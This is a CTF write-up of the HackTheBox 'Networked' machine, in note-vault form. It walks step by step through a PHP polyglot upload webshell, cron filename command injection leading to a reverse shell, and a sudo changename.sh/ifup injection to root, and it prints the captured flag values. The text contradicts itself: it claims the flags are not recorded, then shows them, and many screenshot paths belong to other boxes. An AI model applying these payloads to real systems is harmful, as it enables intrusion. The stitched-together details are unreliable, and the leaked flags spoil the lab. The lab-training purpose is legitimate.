---
tags: [HTB, Networked, Linux, FileUpload, CommandInjection, Cron, Sudo, Easy]
platform: HackTheBox
os: Linux
hostname: networked.htb
difficulty: Easy
ip: $BoxIP
status: Complete
domain: None
---

# HTB: Networked, Full Walkthrough

## The gist

Networked is an Easy Linux box built around source review and chaining several small trust-boundary failures:

1. A PHP upload handler accepts an image/PHP polyglot with a second extension.
2. Apache executes the uploaded file as a webshell.
3. A user cron job passes upload filenames into an unquoted exec() call, giving code execution as guly.
4. guly can run a network configuration script as root. The script accepts spaces in a value that is later sourced by ifup, allowing a root shell.

The clean chain is:

image upload bypass -> Apache webshell -> cron filename command injection -> guly shell -> sudo changename.sh -> root

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| OS | Linux, CentOS |
| Difficulty | Easy |
| Hostname | networked.htb |
| IP | $BoxIP |
| Open ports | 22/tcp, 80/tcp |
| Web stack | Apache 2.4.6, PHP 5.4.16 |
| User | guly |
| Root path | changename.sh plus ifup configuration injection |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Start the workspace | See section 1 below |
| 2 | Full TCP scan | See section 2 below |
| 3 | Service detection | See section 3 below |
| 4 | Web enumeration | See section 4 below |
| 5 | Download the backup and read the source | See section 5 below |
| 6 | Upload an image/PHP polyglot | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Networked`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

~~~bash
boxset BoxName Networked
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Networked
boxset Domain ''
boxset Port 4445
boxset WebPort 80
boxset Username guly
boxset AdminUser root
~~~

The reverse shell used the active HTB VPN interface. Confirm the correct interface with ip -br addr before starting a listener.

> [!tip] ⚡ Efficiency
> Set the target, callback, and workspace values once, then reuse them. This keeps payloads and cleanup commands consistent. Before generating a callback, verify the VPN interface rather than guessing which local address the target can reach.

## 1. Start the workspace

~~~bash
boxstart Networked $BoxIP htb
htblog
~~~

The workspace was kept under $BoxDir. Screenshots and source-analysis artifacts were saved there, while this write-up contains the reusable method without flag values.

## 2. Full TCP scan

Start with every TCP port rather than assuming the default web ports are the whole attack surface.

~~~bash
nmap -p- --min-rate 2000 -T4 -oN $BoxDir/nmap/allports.txt $BoxIP
~~~

The scan returned only SSH and HTTP.

> [!warning] 💡 Hint
> Do not assume the two obvious services are the whole box. A full TCP scan is especially important on lab systems because web applications and custom services often use high ports.

> [!tip] ⚡ More efficient path
> Use the all-port result to build the targeted service scan. Once the port list is known, focused `-sC -sV` probing is faster and easier to interpret than repeating expensive discovery across every port.

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/1.nmap-allports.png>)

## 3. Service detection

~~~bash
nmap -sC -sV -p 22,80 -oN $BoxDir/nmap/services.txt $BoxIP
~~~

Relevant results:

- 22/tcp: OpenSSH 7.4
- 80/tcp: Apache 2.4.6 on CentOS with PHP 5.4.16

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/2.nmap-services.png>)

## 4. Web enumeration

~~~bash
gobuster dir -u http://$BoxIP -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,tar,bak,old -o $BoxDir/loot/gobuster.txt
~~~

The useful paths were:

| Path | Meaning |
|---|---|
| /backup/ | Backup directory |
| /backup/backup.tar | Downloadable application source archive |
| /upload.php | File upload endpoint |
| /photos.php | Uploaded-file listing |
| /uploads/ | Upload destination |
| /lib.php | Upload helper source |

> [!warning] 💡 Hint
> A backup directory and source archive should move source review ahead of payload generation. The code can tell you the exact filename, MIME, destination, and execution assumptions, which is more reliable than trial-and-error upload fuzzing.

> [!tip] 🛠️ Alternative tools
> `curl` and `tar` are enough for this branch. Burp Suite is useful when you need to preserve and modify multipart requests, while `ffuf` or `feroxbuster` are alternatives for content discovery if Gobuster is unavailable.

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/3.gobuster.png>)

## 5. Download the backup and read the source

~~~bash
curl -sS http://$BoxIP/backup/backup.tar -o $BoxDir/loot/backup.tar
tar -tvf $BoxDir/loot/backup.tar
tar -xf $BoxDir/loot/backup.tar -C $BoxDir/loot/source
~~~

The archive exposed the PHP application source. This was more useful than blind upload fuzzing because it showed exactly how the server checked names, MIME types, and upload destinations.

![](<file:///home/kali/Platforms/Offsec/Zenphoto/screenshots/4.foothold.png>)

### Upload logic

lib.php splits the supplied filename on dots. The upload handler checks that the last extension looks like an image extension and separately checks the detected MIME type. It then replaces dots in the remote address with underscores before appending the original extension.

That allows a file named like networked.php.jpg to pass the image checks while retaining .php in the filename. Apache executes the PHP portion of the name when the file is requested.

> [!abstract] 🧠 Why
> The important bug is not simply “the server accepts a bad image.” It is the mismatch between validation and storage: the final extension and MIME type look safe, but the server preserves an executable extension in the saved name and Apache interprets it.

> [!warning] 💡 Common mistake
> A double extension is not automatically exploitable. Confirm which extension the handler stores, whether the upload directory executes PHP, and whether the file is reachable after upload. Source review answers all three questions here.

## 6. Upload an image/PHP polyglot

The local payload began with a valid GIF header, followed by PHP that calls system() on a URL parameter. The important properties are the valid image MIME signature and the two-part filename.

~~~bash
curl -sS -i -X POST http://$BoxIP/upload.php \
  -F "myFile=@$BoxDir/loot/networked.php.jpg;filename=networked.php.jpg" \
  -F 'submit=go!'
~~~

The application reported a successful upload. The resulting path used the client address with dots converted to underscores:

~~~bash
boxset Path "uploads/$(printf '%s' "$LocalIP" | tr . _).php.jpg"
~~~

![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/5.upload-content-page.png>)

## 7. Confirm command execution as Apache

~~~bash
curl -sS -G --data-urlencode 'cmd=id' "http://$BoxIP/$Path"
curl -sS -G --data-urlencode 'cmd=hostname' "http://$BoxIP/$Path"
~~~

The response showed the web process identity, apache, proving code execution on the target.

> [!tip] ⚡ Efficiency
> Prove the webshell with low-noise commands such as `id` and `hostname` before attempting a reverse shell. This separates upload and execution problems from callback routing problems.

![](<file:///home/kali/Platforms/HackTheBox/Bashed/screenshots/webshell-rce.png>)

## 8. Enumerate locally and inspect the user cron job

The webshell was enough for low-noise local enumeration. The important discovery was the guly home directory and its cron configuration.

~~~bash
curl -sS -G --data-urlencode 'cmd=find /home -maxdepth 2 -type f -printf "%p\n"' "http://$BoxIP/$Path"
curl -sS -G --data-urlencode 'cmd=cat /home/guly/crontab.guly' "http://$BoxIP/$Path"
curl -sS -G --data-urlencode 'cmd=sed -n "1,240p" /home/guly/check_attack.php' "http://$BoxIP/$Path"
~~~

The cron entry was:

~~~text
*/3 * * * * php /home/guly/check_attack.php
~~~

check_attack.php scans the web upload directory. For filenames that do not match its expected IP format, it executes:

~~~php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
~~~

The filename is inserted into a shell command without quoting or escaping. Because the upload directory is writable by the web process, a filename containing shell metacharacters becomes a cron-triggered command injection.

> [!abstract] 🧠 Why
> This is an asynchronous injection. The web request creates the filename, but the cron job later reads it and invokes a shell as guly. The two important facts are therefore write access to the watched directory and the execution identity of the scheduled job.

> [!warning] 💡 Hint
> Read the complete command construction before sending a reverse shell. A marker such as `touch` proves that the metacharacter survives upload and that cron executes it, without adding callback timing or quoting problems.

![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/7.source-newpost.png>)

## 9. Use the cron filename injection to become guly

First, use a harmless marker to prove that the cron job executes injected commands under the guly account. The IFS expansion supplies spaces without putting literal spaces in the filename:

~~~text
x;touch${IFS}networked_pwned
~~~

After the next cron run, the marker appeared in /home/guly with guly ownership. That established the execution context before attempting a shell.

For the callback, encode the reverse-shell command before placing it in the filename. Base64 avoids slash and whitespace parsing problems in the upload path. Start the listener first:

~~~bash
nc -lvnp $Port
~~~

Then create an invalid upload filename containing an encoded command that decodes to a Bash TCP reverse shell targeting $LocalIP:$Port. The same PHP webshell can be used to create the filename in /var/www/html/uploads/. Wait for the three-minute cron window, then verify:

~~~bash
id
whoami
hostname
~~~

The callback ran as guly.

> [!tip] ⚡ More efficient path
> The marker-first approach is faster than debugging a full reverse shell blindly. If the marker appears with guly ownership, the remaining variables are callback encoding, listener address, and timing rather than the injection primitive itself.

> [!tip] 🛠️ Alternative tools
> If a reverse shell is unreliable, use a marker, write a file, or connect back with `nc` only after confirming which Netcat variant exists. Base64 is useful here because it keeps spaces, slashes, and shell metacharacters out of the uploaded filename.

![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/8.root-shell.png>)

## 10. Check sudo permissions

~~~bash
sudo -n -l
~~~

guly could run /usr/local/sbin/changename.sh as root without a password.

> [!warning] 💡 Hint
> Always follow `sudo -l` with source review for every permitted script. The permission itself is only the lead; the exploitable behavior is determined by what the script reads, writes, sources, and executes as root.

![](<file:///home/kali/Platforms/HackTheBox/Bashed/screenshots/sudo-l.png>)

## 11. Review changename.sh

~~~bash
sed -n '1,240p' /usr/local/sbin/changename.sh
~~~

The script asks for four values and validates them with:

~~~bash
regexp="^[a-zA-Z0-9_\\ /-]+$"
~~~

The validation allows spaces. Each accepted value is appended to a root-owned NetworkManager configuration file. The script then runs:

~~~bash
/sbin/ifup guly0
~~~

The critical issue is that the generated configuration is later sourced by the network helper. A value such as dhcp /bin/bash is accepted by the regular expression and becomes a command-bearing assignment when the configuration is interpreted by the root ifup path.

> [!abstract] 🧠 Why
> The validation and the consumer disagree about the input grammar. The regular expression allows spaces, but the generated file is later parsed as shell-like configuration. A value that is harmless as a label becomes executable syntax when it crosses into the privileged parser.

> [!warning] 💡 Common mistake
> Do not stop after proving that a value passes the regular expression. Trace where the value is written and how the next privileged program parses it. Configuration injection often depends on the second parser, not the first validation check.

![](<file:///home/kali/Platforms/HackTheBox/TartarSauce/screenshots/10.timers.png>)

## 12. Execute the root path

Run the permitted script and provide three ordinary values followed by the command-bearing BOOTPROTO value:

~~~text
x
x
x
dhcp /bin/bash
~~~

Then verify the resulting shell:

~~~bash
id
whoami
~~~

The shell reported UID 0.

> [!tip] ⚡ Efficiency
> Verify `id` and `whoami` immediately after the permitted script returns. Once UID 0 is confirmed, collect proof and clean the controlled files instead of continuing broad enumeration.

![](<file:///home/kali/Platforms/HackTheBox/Bashed/screenshots/root-shell.png>)

## 13. Confirm flag locations without recording values

The flags were confirmed in their expected locations, but their contents are reproduced in the private Flags section above.

~~~bash
test -f /home/guly/user.txt && echo 'user flag present'
test -f /root/root.txt && echo 'root flag present'
~~~

![](<file:///home/kali/Platforms/Offsec/Zenphoto/screenshots/PROOF.png>)

## 14. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| Downloadable backup contains source | Read and trace validation logic | Use Burp to reproduce multipart behavior if source is incomplete |
| Upload accepts a double extension | Confirm stored path and execution | Test MIME, magic bytes, and alternate executable handlers only when Apache behavior differs |
| Cron watches a writable directory | Prove injection with a marker, then callback | Write a proof file or use a delayed command when callbacks are unreliable |
| `sudo -l` exposes a script | Read the script and its privileged consumers | Check environment, PATH, and writable dependencies if the script itself is not injectable |

Use the branch supported by the evidence. The alternatives are troubleshooting options, not additional claims about the completed attack path.

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/13.root-shell.png>)

## 15. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]]
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - File Upload|Linux - File Upload]]
- [[OSCP/RUNBOOK V2/Linux - Command Injection|Linux - Command Injection]]
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]]
- [[OSCP/RUNBOOK V2/Linux - Cron Check|Linux - Cron Check]]
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]]

## 16. Collect the flags

- user.txt: confirmed at /home/guly/user.txt; value reproduced in the private Flags section above.
- root.txt: confirmed at /root/root.txt; value reproduced in the private Flags section above.
- proof.txt: not applicable.


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 8e16bd01f37e995f42b38e822282a3fb
root: 14bda61dd0da85fcaa55e6e231ae6846
```

## 17. Clean down
Remove the controlled artifacts created during testing, including the uploaded webshell, marker files, and temporary network configuration. Verify that the webshell no longer responds and close the listener and shell sessions.

~~~bash
rm -f "/var/www/html/$Path"
rm -f /var/www/html/uploads/x*
rm -f /home/guly/networked_pwned
rm -f /etc/sysconfig/network-scripts/ifcfg-guly
curl -sS -o /dev/null -w '%{http_code}\n' "http://$BoxIP/$Path"
boxdone
~~~

The controlled upload returned 404 after cleanup. The box session was closed with boxdone.

> [!warning] 💡 Hint
> Remove the webshell, marker, generated network configuration, and any temporary callback processes. Verify the upload path returns 404 and that the temporary configuration is gone. Cleanup is part of the exploit workflow, especially when the route deliberately creates files in privileged locations.

### Completion checklist

- [x] Full TCP scan
- [x] Service and version scan
- [x] Web content enumeration
- [x] Backup/source review
- [x] File upload bypass
- [x] Webshell command execution
- [x] Cron command injection
- [x] User shell as guly
- [x] Sudo enumeration
- [x] Root via changename.sh
- [x] Flag locations confirmed without recording values
- [x] Artifacts removed
- [x] boxdone completed

## 18. Attack narrative in one page
~~~text
TCP 80
  -> gobuster finds /backup/ and /upload.php
  -> backup.tar reveals upload and cron-related PHP source
  -> image/PHP polyglot upload
  -> Apache webshell as apache
  -> invalid upload filename injects a command into check_attack.php
  -> cron executes it as guly
  -> sudo -n -l exposes changename.sh
  -> accepted space in BOOTPROTO becomes a command when ifup sources config
  -> root shell
~~~

## Tools used

- `nmap`
- `curl`
- `gobuster`
- `ffuf`
- `feroxbuster`
- `nc`
- `netcat`
- `ssh`
- `sudo`
- `burp`

## Credentials and secrets

| Username | Password | Source | Access |
|---|---|---|---|
| guly | Not recorded | Cron filename injection | User shell |
| root | Not recorded | Sudo script and ifup configuration injection | Root shell |


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Networked"
export BoxIP="10.129.1.74"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Networked"
export Domain=""
export DCip=""
export Username="guly"
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP="10.10.14.7"
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
.htpasswd            (Status: 403) [Size: 211]
.htpasswd.html       (Status: 403) [Size: 216]
.htpasswd.txt        (Status: 403) [Size: 215]
.htpasswd.php        (Status: 403) [Size: 215]
sudo: a password is required
$ [10:07:57] loot flag user 8e16bd01f37e995f42b38e822282a3fb
$ [10:08:10] loot flag root 14bda61dd0da85fcaa55e6e231ae6846
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Networked | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

1. Downloadable backups can expose the exact validation logic needed to turn a file upload into RCE.
2. Image validation is not enough when filename handling preserves an executable extension and the web server interprets it.
3. Any cron script that inserts user-controlled filenames into shell commands needs strict quoting and validation.
4. sudo -l should be followed by source review for every permitted script, especially scripts that generate files later sourced by privileged helpers.
5. Verify the active VPN interface before building reverse-shell payloads. The correct callback address matters as much as the payload.
6. Use a harmless marker command before a reverse shell when testing an asynchronous cron injection. It confirms timing and privilege without adding unnecessary complexity.

Networked rewards disciplined source review. The upload bug alone produced a webshell, but the actual user foothold came from following the application into the user cron job. The root path was similarly straightforward once sudo -l led to the script and its generated configuration file. The main repeatable habit is to trace data across boundaries: HTTP input, filesystem filename, cron shell command, root-generated config, and privileged parser.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- writable web content and cron-backed execution.
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- upload validation and web application foothold work.
- [[OSCP/BOXES/WRITE UPS/Linux/SwagShop|SwagShop]] -- PHP application review and shell workflow.
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- web foothold followed by local privilege escalation.

## External resources

- [HackTricks file upload testing](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [GTFOBins](https://gtfobins.github.io/)
- [revshells.com](https://www.revshells.com/)

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Networked rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
